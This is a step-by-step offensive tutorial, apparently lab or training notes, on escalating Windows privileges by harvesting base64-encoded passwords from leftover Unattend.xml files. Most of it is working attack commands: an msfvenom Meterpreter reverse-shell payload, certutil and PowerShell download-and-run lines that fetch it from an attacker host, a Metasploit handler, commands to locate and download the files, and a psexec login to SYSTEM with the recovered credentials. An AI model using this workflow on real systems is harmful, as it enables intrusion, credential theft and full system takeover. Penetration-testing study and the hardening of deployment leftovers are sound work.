# Hunting Passwords in Windows Configuration Files

## 🎯 Why It Works

During automated Windows deployments, **Unattended Setup** uses XML files that may contain:
- Local Administrator credentials  
- Domain join info  
- Auto-logon settings  

If left on the system post-install → **plaintext or base64-encoded passwords** exposed.

### 🔑 Critical Files (Always Check!)

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

> ⚠️ Passwords are often **base64-encoded** (not hashed!) → trivial to decode.

---
## 🔍 Full Exploitation Workflow

### Step 1: Gain Initial Access (Low-Priv User)

You have GUI access as low-priv user (`student`).
#### Enumerate Privileges
```cmd
whoami /priv
```
→ Confirms limited rights — need to escalate.

---
### Step 2: Generate Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > payload.exe
```

> ❓ **x64 vs x86?**  
> - Use `x64` if target is 64-bit (more stable)  
> - `x86` works on both, but **x64 is preferred** for 64-bit systems

---
### Step 3: Host Payload

```bash
python3 -m http.server 80   # or python -m SimpleHTTPServer 80
```

#### Download on Target (Windows CMD)
```cmd
certutil -urlcache -f http://192.168.1.5/payload.exe payload.exe
```

> 💡 **Why `certutil`?**  
> - Built into Windows (no AV flags)  
> - `-urlcache -f` = force download, ignore cache  
> 
> ✅ Alternatives:  
> - `powershell -c "iwr http://ip/payload.exe -O payload.exe"`  

---
### Step 4: Set Up Listener (Handler)

```msf
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 1234
run
```

> ❓ **What is a handler?**  
> → It’s a **listener** that catches reverse connections and delivers the **Meterpreter stage**.  
> → Not a shell itself — it **enables** the shell.

---
### Step 5: Execute & Get Meterpreter

On target:
```cmd
payload.exe
```
→ Meterpreter session opens.

---
### Step 6: Hunt for Unattend Files
#### Option A: Search Entire System
```msf
meterpreter > search -f Unattend.xml
meterpreter > search -f Autounattend.xml
```

#### Option B: Go Directly
```msf
meterpreter > cd C:\\Windows\\Panther
meterpreter > dir
meterpreter > download Unattend.xml
```

---
### Step 7: Extract & Decode Password

In `Unattend.xml`, look for:
```xml
<AutoLogon>
    <Password>
        <Value>QWRtaW5AMTIz</Value>  <!-- base64 -->
    </Password>
    <Username>Administrator</Username>
</AutoLogon>
```

Decode:
```bash
echo "QWRtaW5AMTIz" | base64 -d
# Output: Admin@123
```

> ❗ **Not a hash!** Base64 is **encoding**, not encryption → instantly reversible.

> ⚠️ **Note**: Admin may have changed password post-install — always test!

---
### Step 8: Authenticate with Recovered Creds

```bash
psexec.py Administrator:Admin@123@192.168.1.10
```
✅ Success:
```
C:\Windows\system32> whoami
nt authority\system
```

---

